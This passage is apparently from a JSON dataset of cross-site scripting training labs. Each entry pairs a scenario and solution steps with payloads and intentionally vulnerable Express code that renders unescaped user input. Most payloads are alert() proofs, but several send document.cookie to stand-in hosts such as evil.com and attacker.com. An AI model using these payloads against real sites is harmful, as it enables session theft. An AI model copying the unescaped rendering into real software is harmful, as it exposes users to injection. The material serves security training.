      "Open lightbox viewer",
      "Payload triggers inside the alt-text preview"
    ],
    "payloads": [
      "<img src=x onerror=alert('lightboxXSS')>",
      "<script>alert('altXSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet altText = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-alt', (req, res) => {\n  altText = req.body.alt;\n  res.redirect('/viewer');\n});\n\napp.get('/viewer', (req, res) => {\n  res.send(`<html><body><img src='img.jpg' alt='${altText}'><p>${altText}</p></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via URL shortening preview page",
    "Lab Description": "The app generates previews for shortened URLs by displaying the destination page title. If the destination includes attacker-controlled HTML in its title, it can be injected into the preview page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Shorten a malicious page with <title><script>alert(1)</script></title>",
      "Preview the shortened link",
      "Script executes inside preview panel"
    ],
    "payloads": [
      "<title><script>alert('shortXSS')</script></title>",
      "<title><img src=x onerror=alert(1)></title>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit-url', (req, res) => {\n  title = req.body.title;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><h2>Preview:</h2><div>${title}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom dashboard widget title",
    "Lab Description": "Users can add widgets to a customizable dashboard and set titles for them. These titles are rendered in cards using innerHTML. If malicious content is set as title, it leads to XSS on render.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a widget with title <script>alert(1)</script>",
      "View the widget on the dashboard",
      "Script executes inside the widget title"
    ],
    "payloads": [
      "<script>alert('widgetTitleXSS')</script>",
      "<img src=x onerror=alert('widget')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet widgetTitle = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-widget', (req, res) => {\n  widgetTitle = req.body.title;\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  res.send(`<html><body><div class='card'>${widgetTitle}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic breadcrumb JSON injection in SPA routing",
    "Lab Description": "The app uses client-side JavaScript to generate breadcrumb navigation from a JSON structure passed via query parameters. The values are inserted into the DOM using innerHTML. If attackers inject script via breadcrumb labels, it results in DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Construct a query like ?crumbs=[{\"label\":\"<img src=x onerror=alert(1)>\"}]",
      "App parses and renders breadcrumb using innerHTML",
      "Script executes inside breadcrumb path"
    ],
    "payloads": [
      "[{\"label\":\"<script>alert('jsonXSS')</script>\"}]",
      "[{\"label\":\"<img src=x onerror=alert('breadcrumb')>\"}]"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/spa', (req, res) => {\n  const data = req.query.crumbs || '[{\"label\":\"Home\"}]';\n  res.send(`<html><body>\n    <div id='breadcrumbs'></div>\n    <script>\n      const crumbs = JSON.parse('${data}');\n      document.getElementById('breadcrumbs').innerHTML = crumbs.map(c => c.label).join(' / ');\n    </script>\n  </body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chart label injection in analytics dashboard",
    "Lab Description": "The dashboard allows users to label chart segments (like pie slices). Labels are rendered in the legend via innerHTML. If a label contains HTML, it gets executed when the chart renders.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit chart data with a label like <img src=x onerror=alert(1)>",
      "Render the chart",
      "Observe script execution in the legend"
    ],
    "payloads": [
      "<script>alert('chartXSS')</script>",
      "<img src=x onerror=alert('chart')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet labels = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/chart', (req, res) => {\n  labels.push(req.body.label);\n  res.redirect('/view-chart');\n});\n\napp.get('/view-chart', (req, res) => {\n  const html = labels.map(l => `<li>${l}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via newsletter topic selection preview",
    "Lab Description": "Users can choose newsletter topics and preview their newsletter. Topic names are displayed using innerHTML. Injected topic names result in XSS inside the preview.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Select a topic with name <script>alert(1)</script>",
      "Preview the newsletter content",
      "Observe the payload executing in preview area"
    ],
    "payloads": [
      "<script>alert('newsletterXSS')</script>",
      "<img src=x onerror=alert('newsletter')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet topic = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-topic', (req, res) => {\n  topic = req.body.topic;\n  res.redirect('/preview-newsletter');\n});\n\napp.get('/preview-newsletter', (req, res) => {\n  res.send(`<html><body><h2>Weekly Topic:</h2><div>${topic}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via browser tab title injection from form field",
    "Lab Description": "The site allows setting a custom browser tab title using input from a form. The title is inserted using `document.title = ...`, and if the value contains HTML with closing tags, script can escape and execute.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit title: </title><script>alert(1)</script>",
      "Browser injects into DOM and closes title tag early",
      "Script executes immediately"
    ],
    "payloads": [
      "</title><script>alert('tabXSS')</script>",
      "\"></title><img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-tab-title', (req, res) => {\n  title = req.body.title;\n  res.redirect('/tab');\n});\n\napp.get('/tab', (req, res) => {\n  res.send(`<html><head><script>document.title = '${title}'</script></head><body></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via form autofill memory viewer",
    "Lab Description": "The app allows users to see recently submitted values for form inputs as suggestions. These values are rendered via innerHTML inside a dropdown. If user input is stored unsanitized, XSS can occur.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit input value: <img src=x onerror=alert(1)>",
      "Open the form again",
      "Dropdown suggestions display payload and execute it"
    ],
    "payloads": [
      "<img src=x onerror=alert('autofillXSS')>",
      "<svg/onload=alert('fill')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet memory = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/save-input', (req, res) => {\n  memory.push(req.body.input);\n  res.redirect('/form');\n});\n\napp.get('/form', (req, res) => {\n  const html = memory.map(i => `<option>${i}</option>`).join('');\n  res.send(`<html><body><input list='recent'><datalist id='recent'>${html}</datalist></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via podcast episode title in media playlist",
    "Lab Description": "The application displays a podcast playlist with user-defined episode titles. Titles are rendered using innerHTML in a list. A malicious title can inject and execute scripts when the list is loaded.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a podcast episode with title: <script>alert(1)</script>",
      "Visit the playlist page",
      "Script executes in the episode list"
    ],
    "payloads": [
      "<script>alert('podcastXSS')</script>",
      "<img src=x onerror=alert('episode')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet episodes = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-episode', (req, res) => {\n  episodes.push(req.body.title);\n  res.redirect('/playlist');\n});\n\napp.get('/playlist', (req, res) => {\n  const html = episodes.map(e => `<li>${e}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom notification banner text",
    "Lab Description": "Admins can set a global notification banner that appears on every page. The message is stored and injected into a top banner using innerHTML. Malicious content leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit banner text: <img src=x onerror=alert(1)>",
      "Visit any page where banner is rendered",
      "Payload executes in global UI"
    ],
    "payloads": [
      "<img src=x onerror=alert('bannerXSS')>",
      "<script>alert('notice')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet banner = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-banner', (req, res) => {\n  banner = req.body.msg;\n  res.redirect('/home');\n});\n\napp.get('/home', (req, res) => {\n  res.send(`<html><body><div class='banner'>${banner}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via shopping cart item customization note",
    "Lab Description": "Users can leave custom notes per item in their cart. These notes are rendered inside the cart summary using innerHTML. A malicious note can trigger script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add an item with note: <script>alert(1)</script>",
      "Go to the cart summary",
      "Script executes in the note preview"
    ],
    "payloads": [
      "<script>alert('cartXSS')</script>",
      "<img src=x onerror=alert('note')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet notes = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  notes.push(req.body.note);\n  res.redirect('/cart');\n});\n\napp.get('/cart', (req, res) => {\n  const html = notes.map(n => `<p>${n}</p>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via video player caption editor",
    "Lab Description": "Users can upload or edit captions for videos. These captions are rendered under the video using innerHTML. A caption line with HTML triggers script execution when played or displayed.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Edit a caption to: <img src=x onerror=alert(1)>",
      "Play the video or load the caption viewer",
      "Observe the XSS payload triggering in subtitle track"
    ],
    "payloads": [
      "<script>alert('captionXSS')</script>",
      "<img src=x onerror=alert('subtitles')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet captions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-caption', (req, res) => {\n  captions.push(req.body.line);\n  res.redirect('/player');\n});\n\napp.get('/player', (req, res) => {\n  const html = captions.map(c => `<div>${c}</div>`).join('');\n  res.send(`<html><body>${html}<video controls src='video.mp4'></video></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via project milestone label in timeline",
    "Lab Description": "The project management interface allows naming milestones. The names appear in a visual timeline using innerHTML. A malicious name results in DOM-based XSS when the timeline loads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create milestone with label: <script>alert(1)</script>",
      "Open timeline view",
      "Script executes as label renders in the chart"
    ],
    "payloads": [
      "<script>alert('timelineXSS')</script>",
      "<img src=x onerror=alert('milestone')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet milestones = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-milestone', (req, res) => {\n  milestones.push(req.body.name);\n  res.redirect('/timeline');\n});\n\napp.get('/timeline', (req, res) => {\n  const html = milestones.map(m => `<div class='milestone'>${m}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "CMS Stored XSS in blog post title rendering",
    "Lab Description": "This lab simulates a CMS where blog post titles are stored and displayed without sanitization. The application displays the post title directly in the HTML document title tag. To solve: Inject a JavaScript payload that executes when any user opens the blog post.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the blog post submission request.",
      "Verify raw HTML output to confirm reflection in <title> tag.",
      "Craft payload: <script>document.location='//evil.com?c='+document.cookie</script>",
      "Submit as blog title and publish post.",
      "Open post in a new session to trigger script."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet posts = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-post', (req, res) => {\n  const title = req.body.title;\n  posts.push(title);\n  res.redirect('/posts');\n});\n\napp.get('/posts', (req, res) => {\n  const latest = posts[posts.length - 1] || 'Untitled';\n  res.send(`<!DOCTYPE html><html><head><title>${latest}</title></head><body><h1>${latest}</h1></body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
    ]
  },
  {
    "Lab scenario": "API gateway DOM-based XSS in error message handling",
    "Lab Description": "This lab simulates a DOM-based XSS vulnerability in an API gateway's debug interface. Client-side JavaScript updates error messages dynamically using `innerHTML`. To solve: Exploit an error endpoint to inject a DOM-based XSS payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to submit a malformed request to /api/debug?error=<payload>.",
      "Confirm injection into error display area on UI.",
      "Craft payload: <svg onload=alert(1)> for DOM execution.",
      "Paste into API request and reload debug page.",
      "Observe code execution without backend reflection."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/api/debug', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='error-box'></div><script>document.getElementById('error-box').innerHTML = decodeURIComponent(location.search.split('error=')[1] || '');</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<svg onload=alert(1)>",
      "<img src=x onerror=alert(document.domain)>"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Mutation-based XSS via dynamic widget rename",
    "Lab Description": "This lab mimics an IoT dashboard where widgets can be renamed inline. The application uses a mutation observer to react to DOM changes but fails to sanitize new content. To solve: Inject malicious content that gets executed when the dashboard mutates the DOM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect DOM widget element using browser dev tools.",
      "Inject: <input value='</input><script>alert(1)</script>' /> into rename field.",
      "Let the MutationObserver parse and append innerHTML.",
      "Trigger mutation by saving renamed widget.",
      "Observe payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\nlet widget = '';\napp.post('/rename-widget', (req, res) => {\n  widget = req.body.name;\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='widget'></div><script>const observer = new MutationObserver(() => { document.getElementById('widget').innerHTML = widget; }); observer.observe(document.body, { childList: true, subtree: true });</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<input autofocus onfocus=alert(1)>",
      "</input><script>alert('MUTATION')</script>"
    ]
  },
  {
    "Lab scenario": "Banking portal Reflected XSS in HTTP error page",
    "Lab Description": "This lab exposes a reflected XSS flaw in the 404 error page of a banking portal. The URL path is reflected into the error template without encoding. To solve: Inject a JavaScript payload in the URL that causes a popup when visiting a broken link.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to crawl URLs and identify dynamic error page.",
      "Send payload in broken path: /thisdoesnotexist<script>alert(1)</script>",
      "Observe reflected input in HTML without sanitization.",
      "Confirm execution of payload on page load.",
      "Try alternative payloads to avoid WAF."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use((req, res) => {\n  res.status(404).send(`<!DOCTYPE html><html><body><h2>Page not found: ${req.url}</h2></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "/<script>alert(1)</script>",
      "/%3Cscript%3Ealert(1)%3C/script%3E"
    ]
  },
  {
    "Lab scenario": "CMS DOM-based XSS via live preview panel",
    "Lab Description": "This lab simulates a WYSIWYG editor in a CMS where user content is shown in a live preview using `innerHTML`. The editor does not strip script tags before rendering. To solve: Inject a script that executes inside the live preview panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open CMS editor and type: <script>alert(123)</script> in the body.",
      "Check if the preview panel updates instantly via innerHTML.",
      "Use browser dev tools to confirm DOM rendering.",
      "Test bypasses like <img src=x onerror=alert(1)>",
      "Trigger execution in preview panel context."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet previewContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-preview', (req, res) => {\n  previewContent = req.body.content;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='preview'>${previewContent}</div></body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert(123)</script>",
      "<img src=x onerror=alert(1)>"
    ]
  },
  {
    "Lab scenario": "Healthcare portal Stored XSS in patient notes",
    "Lab Description": "This lab mimics a hospital portal where doctors can save notes on patients. These notes are rendered in the admin dashboard without sanitization. The application stores the note input directly and renders it as HTML. To solve: Inject a script in the patient notes to trigger when an admin reviews them.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a doctor and navigate to 'Add Notes' section.",
      "Use Burp Suite to intercept the note submission request.",
      "Inject payload: <script>new Image().src='//attacker.com?c='+document.cookie</script>",
      "Save the note and log out.",
      "Login as admin and open the patient profile to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet notes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  notes.push(req.body.note);\n  res.redirect('/admin');\n});\n\napp.get('/admin', (req, res) => {\n  const allNotes = notes.map(n => `<p>${n}</p>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${allNotes}</body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('doctor')</script>",
      "<script>fetch('//evil.com?c='+document.cookie)</script>"
    ]
  },
  {
    "Lab scenario": "E-learning platform DOM-based XSS in quiz result summary",
    "Lab Description": "This lab features a DOM-based XSS vulnerability where quiz scores are reflected on the result page without escaping. The application uses location.hash to read and write data via innerHTML. To solve: Inject a malicious script in the fragment that executes in the DOM context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to the quiz results page and observe use of location.hash.",
      "Craft a URL: /results.html#<img src=x onerror=alert('XSS')>",
      "Paste it in the address bar and press Enter.",
      "Observe execution of injected JavaScript in the browser.",
      "Test alternative payloads to bypass possible filters."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/results.html', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='summary'></div><script>document.getElementById('summary').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "#<img src=x onerror=alert('XSS')>",
      "#<svg/onload=alert('HASH')>"
    ]
  },
  {
    "Lab scenario": "Online forum Reflected XSS in topic preview tooltip",
    "Lab Description": "This lab simulates a forum where hovering over a topic shows a preview using query parameters. The content is not sanitized before insertion into an HTML attribute, leading to reflected XSS. To solve: Inject payload via URL to trigger alert on hover.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to find the preview endpoint: /topic/preview?text=",
      "Inject payload: \" onmouseover=alert(1) x=\"",
      "Load the page and hover over the preview tooltip.",
      "Observe execution of JavaScript from the injected attribute.",
      "Experiment with quotes and encoding variations."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/topic/preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div title='${req.query.text}'>Topic</div></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "\" onmouseover=alert(1) x=\"",
      "\"><script>alert(123)</script>"
    ]
  },
  {
    "Lab scenario": "Admin panel Stored XSS in system notification editor",
    "Lab Description": "This lab contains a stored XSS vulnerability in a system where admins post internal notifications to all users. The input is saved and directly rendered on user dashboards. To solve: Inject a payload as an admin that triggers a script when a user logs in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login to the admin panel and create a new system message.",
      "Inject payload: <iframe srcdoc=\"<script>alert('Notice')</script>\"></iframe>",
      "Save the message and log out.",
      "Login as a normal user and check the dashboard.",
      "Verify script execution upon loading message."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet messages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/admin-message', (req, res) => {\n  messages.push(req.body.message);\n  res.redirect('/user-dashboard');\n});\n\napp.get('/user-dashboard', (req, res) => {\n  const rendered = messages.map(m => `<div>${m}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${rendered}</body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<iframe srcdoc=\"<script>alert('Notice')</script>\"></iframe>",
      "<script>alert('Stored')</script>"
    ]
  },
  {
    "Lab scenario": "IoT smart home DOM-based XSS in log viewer tab",
    "Lab Description": "This lab simulates a smart home dashboard that shows device logs. Logs are appended to the DOM using `innerHTML` from localStorage, allowing injection. To solve: Inject a payload into localStorage and reload the page to trigger execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open browser dev tools and navigate to localStorage.",
      "Set: localStorage.setItem('logs', '<img src=x onerror=alert(\"XSS\")>');",
      "Reload the dashboard and open log viewer tab.",
      "Confirm DOM update via innerHTML causes script execution.",
      "Try different storage-based XSS variations."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/iot-dashboard', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='log-output'></div><script>document.getElementById('log-output').innerHTML = localStorage.getItem('logs');</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert(\"XSS\")>",
      "<script>alert('logs')</script>"
    ]
  },

 {
    "Lab scenario": "Job portal Stored XSS in resume upload notes",
    "Lab Description": "The application allows job seekers to upload resumes with optional notes. These notes are displayed to employers reviewing applications. However, the notes field is stored and rendered without sanitization. To solve: Inject a malicious script into the notes field to execute when the employer views it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register as a job seeker and go to resume upload form.",
      "Intercept the POST request using Burp Suite.",
      "Inject payload: <script>alert('CV XSS')</script> into the notes field.",
      "Submit and log out.",
      "Login as employer and view the resume, triggering the XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet resumes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-resume', (req, res) => {\n  resumes.push(req.body.note);\n  res.redirect('/resumes');\n});\n\napp.get('/resumes', (req, res) => {\n  const view = resumes.map(n => `<div>${n}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${view}</body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('CV XSS')</script>",
      "<img src=x onerror=alert('Resume')>"
    ]
  },
  {
    "Lab scenario": "Social media app Reflected XSS in image tag generator",
    "Lab Description": "The app generates HTML <img> tags from user-provided image URLs and returns them in a preview. The input is not properly sanitized, and special characters can break out of the tag context. To solve: Inject JavaScript into the image URL parameter and force execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to discover the endpoint: /generate-tag?src=",
      "Inject: x onerror=alert('XSS') into the src parameter.",
      "Observe the image tag generated with your payload.",
      "Trigger execution by previewing the image.",
      "Verify XSS fires in the response HTML."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/generate-tag', (req, res) => {\n  const src = req.query.src || '';\n  res.send(`<!DOCTYPE html><html><body><img src='${src}' /></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "x onerror=alert('XSS')",
      "x' onerror='alert(1)"
    ]
  },
  {
    "Lab scenario": "Customer support platform Stored XSS in ticket subject field",
    "Lab Description": "A support ticketing system logs user-submitted issues. The subject of the ticket is directly rendered in the admin panel without escaping, resulting in a stored XSS risk. To solve: Inject a script in the subject field to trigger on admin view.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a new support ticket with subject: <script>alert('Ticket')</script>",
      "Intercept with Burp Suite to confirm it was stored.",
      "Login as support staff and check open tickets.",
      "Observe script executes when the subject is rendered.",
      "Test alternative payloads for filter bypass."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet tickets = []\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push(req.body.subject);\n  res.redirect('/tickets');\n});\n\napp.get('/tickets', (req, res) => {\n  const view = tickets.map(t => `<div>${t}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${view}</body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Ticket')</script>",
      "<svg/onload=alert('Support')>"
    ]
  },
  {
    "Lab scenario": "API documentation tool DOM-based XSS via hash injection",
    "Lab Description": "A JavaScript-powered API doc site uses the URL fragment to display endpoint-specific documentation. The fragment is parsed and inserted into a div via innerHTML. This allows DOM-based XSS when a malicious hash value is used. To solve: Inject a payload into the hash and reload to trigger the XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to /docs.html#intro",
      "Replace fragment with: <img src=x onerror=alert('API')>",
      "Observe innerHTML rendering the fragment as HTML.",
      "Reload the page to confirm execution.",
      "Try obfuscated versions to bypass encoding."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/docs.html', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='content'></div><script>document.getElementById('content').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "#<img src=x onerror=alert('API')>",
      "#<svg/onload=alert('Docs')>"
    ]
  },
  {
    "Lab scenario": "CMS Mutation-based XSS via JavaScript content injection",
    "Lab Description": "A custom CMS allows inline content editing and uses DOM mutation observers to re-parse user input. Malicious HTML with embedded event handlers is not sanitized before being reinjected. To solve: Use mutation-based injection to trigger execution during DOM parsing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login and go to content editor.",
      "Insert: <a href='#' onclick='alert(123)'>Click</a> in the content block.",
      "Save and reload to confirm it persists.",
      "Check if the DOM mutates and re-evaluates handlers.",
      "Use DevTools to confirm event execution on mutation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet content = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-content', (req, res) => {\n  content = req.body.html;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='preview'>${content}</div><script>const observer = new MutationObserver(() => {}); observer.observe(document.getElementById('preview'), {childList: true});</script></body></html>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<a href='#' onclick='alert(123)'>Click</a>",
      "<iframe srcdoc='<script>alert(`CMS`)</script>'></iframe>"
    ]
  },
  {
    "Lab scenario": "E-commerce dashboard Stored XSS in product review system",
    "Lab Description": "The application allows users to leave product reviews, which are rendered on product pages. The review text is not sanitized or escaped before rendering. To solve: Inject a stored XSS payload into a review and trigger it on page load.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Write a review for any product with: <script>alert('Review XSS')</script>",
      "Use Burp Suite to confirm the review is stored in the database.",
      "Reload the product page to trigger the payload.",
      "Test different review lengths and payload placements.",
      "Attempt DOM injection with additional tags like <svg>."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => {\n  reviews.push(req.body.content);\n  res.redirect('/product');\n});\napp.get('/product', (req, res) => {\n  const html = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('Review XSS')</script>",
      "<svg/onload=alert(1)>"
    ]
  },
  {
    "Lab scenario": "Forum platform Reflected XSS in search suggestion API",
    "Lab Description": "The forum uses a live search suggestion endpoint that echoes input directly into a JavaScript-rendered dropdown. No escaping is done on the reflected value. To solve: Inject a script payload into the search box and trigger execution through the live results.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Type <script>alert('XSS')</script> in the search box.",
      "Use OWASP ZAP to intercept and replay the request.",
      "Observe the dropdown HTML response in the developer console.",
      "Trigger the JavaScript execution on hover or suggestion click.",
      "Craft alternative payloads for bypassing character restrictions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<!DOCTYPE html><html><body><ul><li>${q}</li></ul></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=1 onerror=alert(1)>"
    ]
  },
  {
    "Lab scenario": "IoT dashboard DOM-based XSS in device label field",
    "Lab Description": "An IoT device management panel allows setting custom labels for devices. These labels are read from `localStorage` and rendered using `innerHTML` in the dashboard. There's no sanitization before rendering, leading to DOM-based XSS. To solve: Inject a payload into localStorage and reload the page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
